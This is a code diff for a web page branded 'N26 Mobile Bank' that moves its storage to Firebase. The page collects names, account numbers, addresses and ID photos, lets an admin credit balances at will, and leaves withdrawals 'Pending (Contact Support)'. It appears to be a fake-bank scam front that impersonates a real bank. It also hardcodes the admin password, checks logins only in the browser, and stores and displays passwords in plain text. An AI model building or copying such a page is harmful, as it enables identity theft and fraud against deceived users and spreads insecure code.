@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>N26 Mobile Banking</title>
+<title>N26 Mobile Bank</title>
 <style>
 /* --- RESET & BASE --- */
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif}
@@ -97,10 +96,10 @@ tr:hover{background:#f1f5f9}
     <div id="kyc" class="page hidden">
       <div class="card">
         <h3>KYC Verification</h3>
-        <input id="kycName" placeholder="Full Name" readonly>
-        <input id="kycAccount" placeholder="Account Number" readonly>
-        <input id="kycAddress" placeholder="Address" readonly>
-        <input type="file" id="kycPhoto" readonly>
+        <input id="kycName" placeholder="Full Name">
+        <input id="kycAccount" placeholder="Account Number">
+        <input id="kycAddress" placeholder="Address">
+        <input type="file" id="kycPhoto">
         <button id="kycSubmitBtn" onclick="submitKYC()">Submit KYC</button>
       </div>
     </div>
@@ -144,172 +143,232 @@ tr:hover{background:#f1f5f9}
   </div>
 </div>
 
-<script>
-// --- USERS & CURRENT LOGIN ---
-let users = JSON.parse(localStorage.getItem("users") || '{}');
-if(!users.admin){users.admin={password:"Admin1234!",role:"admin",balance:0,name:"Admin",account:"000001",photo:"",address:"",history:[]};saveUsers();}
-let currentUser = localStorage.getItem("currentUser") || null;
+<!-- FIREBASE -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
+import { getFirestore, doc, setDoc, getDoc, updateDoc, collection, getDocs, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
 
-// --- LOGIN ---
-function login(){
-  const u = document.getElementById("loginUser").value.trim();
-  const p = document.getElementById("loginPass").value.trim();
-  if(users[u] && users[u].password===p){
-    currentUser = u;
-    localStorage.setItem("currentUser", u);
-    document.getElementById("loginPage").style.display="none";
-    initBankApp();
-  } else {document.getElementById("loginMsg").innerText="Invalid username or password!";}
-}
+const firebaseConfig = {
+  apiKey: "AIzaSyCpGwKbyOW_LQPrTKoNvDjW_oTD9_cxsnc",
+  authDomain: "n26-bank-888bc.firebaseapp.com",
+  projectId: "n26-bank-888bc",
+  storageBucket: "n26-bank-888bc.firebasestorage.app",
+  messagingSenderId: "112126821080",
+  appId: "1:112126821080:web:c108cc61d84a25f5290dad"
+};
 
-// --- INIT BANK APP ---
-function initBankApp(){
-  document.getElementById("bankApp").classList.remove("hidden");
-  document.getElementById("welcomeUser").innerText=currentUser;
-  if(users[currentUser].role!=="admin") document.getElementById("adminLink").style.display="none";
-  showPage("dashboard"); updateDashboard(); prepareKYC();
-  if(users[currentUser].role==="admin"){setInterval(loadAdminPanel,3000);}
-}
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+let currentUser = null;
 
-// --- SIDEBAR ---
-function toggleSidebar(){
-  const sb=document.getElementById("sidebar");
-  const overlay=document.getElementById("overlay");
-  sb.classList.toggle("show");
-  overlay.style.display=sb.classList.contains("show")?"block":"none";
-}
-
-// --- NAVIGATION ---
-function showPage(p){
-  document.querySelectorAll(".page").forEach(d=>d.classList.add("hidden"));
-  document.getElementById(p).classList.remove("hidden");
-  document.getElementById("sidebar").classList.remove("show");
-  document.getElementById("overlay").style.display="none";
-  if(p==="dashboard") updateDashboard();
-  if(p==="history") loadTransactions();
-  if(p==="admin") loadAdminPanel();
-}
-
-// --- LOGOUT ---
-function logout(){localStorage.removeItem("currentUser");location.reload();}
-
-// --- DASHBOARD ---
-function updateDashboard(){
-  const u = users[currentUser];
-  document.getElementById("userName").innerText = u.name||currentUser;
-  document.getElementById("accountNumber").innerText = u.account||"N/A";
-  document.getElementById("balance").innerText = (u.balance||0).toFixed(2);
-  document.getElementById("profilePic").src = u.photo||"https://via.placeholder.com/120";
-}
-
-// --- KYC ---
-function prepareKYC(){
-  const u=users[currentUser];
-  const kName=document.getElementById("kycName");
-  const kAcc=document.getElementById("kycAccount");
-  const kAddr=document.getElementById("kycAddress");
-  const kPhoto=document.getElementById("kycPhoto");
-  const btn=document.getElementById("kycSubmitBtn");
-  if(u.name && u.account && u.photo && u.address){
-    kName.value=u.name; kAcc.value=u.account; kAddr.value=u.address; btn.style.display="none"; kPhoto.style.display="none"; kAddr.setAttribute("readonly","readonly");
-  } else {
-    kName.removeAttribute("readonly"); kAcc.removeAttribute("readonly"); kAddr.removeAttribute("readonly"); kPhoto.removeAttribute("readonly"); btn.style.display="block"; kPhoto.style.display="block";
+// Initialize Admin Account
+async function initAdmin(){
+  const adminRef = doc(db,"users","admin");
+  const adminSnap = await getDoc(adminRef);
+  if(!adminSnap.exists()){
+    await setDoc(adminRef,{
+      password:"Admin1234!",
+      role:"admin",
+      balance:0,
+      name:"Admin",
+      account:"000001",
+      photo:"",
+      address:"",
+      history:[]
+    });
   }
 }
-function submitKYC(){
+initAdmin();
+
+// ---------------- LOGIN ----------------
+async function login(){
+  const u=document.getElementById("loginUser").value.trim();
+  const p=document.getElementById("loginPass").value.trim();
+  const userRef=doc(db,"users",u);
+  const userSnap=await getDoc(userRef);
+  if(userSnap.exists()){
+    const data=userSnap.data();
+    if(data.password===p){
+      currentUser=u;
+      document.getElementById("loginPage").style.display="none";
+      initBankApp();
+    } else {document.getElementById("loginMsg").innerText="Invalid password";}
+  } else {document.getElementById("loginMsg").innerText="User not found";}
+}
+
+// ---------------- BANK APP ----------------
+async function initBankApp(){
+  document.getElementById("bankApp").classList.remove("hidden");
+  const data=(await getDoc(doc(db,"users",currentUser))).data();
+  document.getElementById("welcomeUser").innerText="Welcome, "+currentUser;
+  document.getElementById("profilePic").src=data.photo||"";
+  document.getElementById("userName").innerText=data.name||currentUser;
+  document.getElementById("balance").innerText=data.balance||0;
+  document.getElementById("accountNumber").innerText=data.account||"N/A";
+
+  // Load KYC
+  document.getElementById("kycName").value=data.name||"";
+  document.getElementById("kycAccount").value=data.account||"";
+  document.getElementById("kycAddress").value=data.address||"";
+
+  loadTransactions();
+}
+
+// Toggle sidebar
+function toggleSidebar(){
+  const sb=document.getElementById("sidebar");
+  const ov=document.getElementById("overlay");
+  sb.classList.toggle("show");
+  ov.style.display=sb.classList.contains("show")?"block":"none";
+}
+
+// Show page
+function showPage(pageId){
+  document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));
+  document.getElementById(pageId).classList.remove("hidden");
+  toggleSidebar();
+}
+
+// Logout
+function logout(){
+  location.reload();
+}
+
+// ---------------- KYC ----------------
+async function submitKYC(){
   const name=document.getElementById("kycName").value.trim();
   const account=document.getElementById("kycAccount").value.trim();
   const address=document.getElementById("kycAddress").value.trim();
-  const file=document.getElementById("kycPhoto").files[0];
-  if(!name||!account||!address){alert("Enter all KYC details"); return;}
-  if(file){
+  const photoInput=document.getElementById("kycPhoto");
+  let photo="";
+  if(photoInput.files.length>0){
     const reader=new FileReader();
-    reader.onload=function(e){
-      users[currentUser].photo=e.target.result;
-      users[currentUser].name=name; users[currentUser].account=account; users[currentUser].address=address;
-      saveUsers(); alert("KYC saved successfully!"); prepareKYC(); showPage("dashboard");
+    reader.onload=async function(e){
+      photo=e.target.result;
+      await updateDoc(doc(db,"users",currentUser),{name,account,address,photo});
+      alert("KYC Submitted Successfully");
+      initBankApp();
     }
-    reader.readAsDataURL(file);
-  } else {alert("Upload passport photo");}
+    reader.readAsDataURL(photoInput.files[0]);
+  } else {
+    await updateDoc(doc(db,"users",currentUser),{name,account,address});
+    alert("KYC Submitted Successfully");
+    initBankApp();
+  }
 }
 
-// --- TRANSACTIONS ---
-function requestTransaction(){
+// ---------------- TRANSACTIONS ----------------
+async function requestTransaction(){
   const amt=parseFloat(document.getElementById("amt").value);
   const type=document.getElementById("txnType").value;
-  if(isNaN(amt)||amt<=0){alert("Enter valid amount"); return;}
-  const txObj={user:currentUser,type,amount:amt,status:type==="Deposit"?"approved":"pending",date:new Date().toLocaleString()};
-  users[currentUser].history.push({...txObj});
-  if(type==="Deposit") users[currentUser].balance+=amt;
-  saveUsers(); document.getElementById("amt").value="";
-  alert(type==="Deposit"?"Deposit Successful":"Transaction placed and pending admin approval.");
+  if(!amt || amt<=0){alert("Enter valid amount"); return;}
+  const txn={type,amount:amt,status:type==="Deposit"?"Successful":"Pending (Contact Support)",date:new Date().toLocaleString()};
+  await updateDoc(doc(db,"users",currentUser),{
+    history: arrayUnion(txn),
+    balance: type==="Deposit" ? (await getDoc(doc(db,"users",currentUser))).data().balance+amt : (await getDoc(doc(db,"users",currentUser))).data().balance
+  });
+  alert(type+" Transaction Placed");
+  loadTransactions();
 }
 
-// --- LOAD USER HISTORY ---
-function loadTransactions(){
-  const txs=users[currentUser].history||[];
-  document.getElementById("txList").innerHTML=txs.map(t=>{
-    let statusClass=t.status==="pending"?"pending":t.status==="approved"?"approved":"rejected";
-    return `${t.type}: $${t.amount} <span class="${statusClass}">${t.status==="pending"?"Pending (Contact Support)":t.status==="approved"?"Successful":"Rejected"}</span><br><span class="small">${t.date}</span>`;
-  }).join("<hr>");
+// Load transactions
+async function loadTransactions(){
+  const data=(await getDoc(doc(db,"users",currentUser))).data();
+  const txList=document.getElementById("txList");
+  txList.innerHTML="";
+  if(data.history){
+    data.history.forEach(tx=>{
+      const p=document.createElement("p");
+      p.innerHTML=`${tx.date} - ${tx.type} - $${tx.amount} - <span class="${tx.status.toLowerCase().includes("pending")?"pending":tx.status==="Successful"?"approved":"rejected"}">${tx.status}</span>`;
+      txList.appendChild(p);
+    });
+  }
 }
 
-// --- ADMIN LOGIN ---
-function adminLoginPrompt(){
-  const uname=prompt("Admin Username:");
-  const pwd=prompt("Admin Password:");
-  if(uname==="admin"&&pwd==="Admin1234!"){users[currentUser].role="admin"; saveUsers(); showPage("admin");} else alert("Wrong admin credentials!");
+// ---------------- ADMIN ----------------
+async function adminLoginPrompt(){
+  const user=prompt("Admin Username:");
+  const pass=prompt("Admin Password:");
+  if(user==="admin" && pass==="Admin1234!"){
+    showPage("admin");
+    loadAdminPanel();
+  } else alert("Invalid Admin Login");
 }
 
-// --- ADMIN FUNCTIONS ---
-function createUser(){
+// Create user
+async function createUser(){
   const u=document.getElementById("newUser").value.trim();
   const p=document.getElementById("newPass").value.trim();
   if(!u||!p){alert("Enter username and password"); return;}
-  if(users[u]){alert("User exists"); return;}
-  users[u]={password:p,role:"user",balance:0,name:"",account:"",photo:"",address:"",history:[]};
-  saveUsers(); loadAdminPanel(); alert("User created successfully!");
-}
-function fundUserBalance(){
-  const u=document.getElementById("fundUser").value.trim();
-  const amt=parseFloat(document.getElementById("fundAmt").value);
-  if(!users[u]||isNaN(amt)||amt<=0){alert("Invalid user or amount"); return;}
-  users[u].balance+=amt;
-  users[u].history.push({user:u,type:"Deposit",amount:amt,status:"approved",date:new Date().toLocaleString()});
-  saveUsers(); loadAdminPanel(); if(currentUser===u) loadTransactions(); alert("User funded successfully!");
+  const userRef=doc(db,"users",u);
+  const userSnap=await getDoc(userRef);
+  if(userSnap.exists()){alert("User already exists"); return;}
+  await setDoc(userRef,{password:p,role:"user",balance:0,name:"",account:"",photo:"",address:"",history:[]});
+  alert("User Created Successfully");
+  document.getElementById("newUser").value="";
+  document.getElementById("newPass").value="";
+  loadAdminPanel();
 }
 
-// --- ADMIN PANEL TABLE ---
-function loadAdminPanel(){
-  const tbody=document.querySelector("#adminTable tbody"); tbody.innerHTML="";
-  Object.keys(users).forEach(u=>{
-    if(u==="admin") return;
-    const user=users[u];
-    const txsHtml=user.history.map((t,i)=>{
-      let statusClass=t.status==='pending'?'pending':t.status==='approved'?'approved':'rejected';
-      return `${t.type}: $${t.amount} <span class="${statusClass}">${t.status==='pending'?'Pending':t.status==='approved'?'Successful':'Rejected'}</span>`;
-    }).join("<br>");
-    const actionBtns=user.history.map((t,i)=>{return t.status==="pending"?`<button onclick="adminApprove('${u}',${i})">✅</button> <button onclick="adminReject('${u}',${i})">❌</button>`:""}).join(" ");
+// Fund user
+async function fundUserBalance(){
+  const u=document.getElementById("fundUser").value.trim();
+  const amt=parseFloat(document.getElementById("fundAmt").value);
+  if(!u||!amt){alert("Enter username and amount"); return;}
+  const userRef=doc(db,"users",u);
+  const userSnap=await getDoc(userRef);
+  if(!userSnap.exists()){alert("User not found"); return;}
+  const data=userSnap.data();
+  const txn={type:"Deposit",amount:amt,status:"Successful",date:new Date().toLocaleString()};
+  await updateDoc(userRef,{
+    balance:data.balance+amt,
+    history: arrayUnion(txn)
+  });
+  alert("User Funded Successfully");
+  document.getElementById("fundUser").value="";
+  document.getElementById("fundAmt").value="";
+  loadAdminPanel();
+}
+
+// Load Admin Panel
+async function loadAdminPanel(){
+  const tbody=document.querySelector("#adminTable tbody");
+  tbody.innerHTML="";
+  const snapshot=await getDocs(collection(db,"users"));
+  snapshot.forEach(docSnap=>{
+    const d=docSnap.data();
     const tr=document.createElement("tr");
-    tr.innerHTML=`<td>${u}</td><td>${user.password}</td><td>${user.balance.toFixed(2)}</td><td>${txsHtml}</td><td>${actionBtns}</td>`;
+    tr.innerHTML=`<td>${docSnap.id}</td><td>${d.password}</td><td>${d.balance}</td><td>${d.history.map(tx=>tx.type+" $"+tx.amount+" ("+tx.status+")").join("<br>")}</td>
+    <td>${d.role!=="admin"?`<button onclick="approveTxn('${docSnap.id}')">Approve</button> <button onclick="rejectTxn('${docSnap.id}')">Reject</button>`:""}</td>`;
     tbody.appendChild(tr);
   });
 }
 
-// --- ADMIN APPROVE/REJECT ---
-function adminApprove(user,idx){
-  const t=users[user].history[idx];
-  if(t.type==="Withdraw" && users[user].balance<t.amount){alert("Insufficient balance"); return;}
-  if(t.type==="Withdraw") users[user].balance-=t.amount; else users[user].balance+=t.amount;
-  t.status="approved"; saveUsers(); loadAdminPanel(); if(currentUser===user) loadTransactions(); updateDashboard();
+// Approve Transaction
+async function approveTxn(user){
+  const userRef=doc(db,"users",user);
+  const data=(await getDoc(userRef)).data();
+  let updated=false;
+  const newHistory=data.history.map(tx=>{
+    if(tx.status==="Pending (Contact Support)" && !updated){updated=true; return {...tx,status:"Successful"};} return tx;
+  });
+  await updateDoc(userRef,{history:newHistory,balance:data.balance});
+  loadAdminPanel();
+  alert("Transaction Approved");
 }
-function adminReject(user,idx){users[user].history[idx].status="rejected"; saveUsers(); loadAdminPanel(); if(currentUser===user) loadTransactions(); updateDashboard();}
 
-// --- SAVE USERS ---
-function saveUsers(){localStorage.setItem("users",JSON.stringify(users)); updateDashboard();}
-
-// --- AUTO LOGIN ---
-if(currentUser){document.getElementById("loginPage").style.display="none"; initBankApp();}
+// Reject Transaction
+async function rejectTxn(user){
+  const userRef=doc(db,"users",user);
+  const data=(await getDoc(userRef)).data();
+  let updated=false;
+  const newHistory=data.history.map(tx=>{
+    if(tx.status==="Pending (Contact Support)" && !updated){updated=true; return {...tx,status:"Rejected"};} return tx;
+  });
+  await updateDoc(userRef,{history:newHistory});
+  loadAdminPanel();
+  alert("Transaction Rejected");
+}
 </script>
 </body>
-</html>
+  </html>
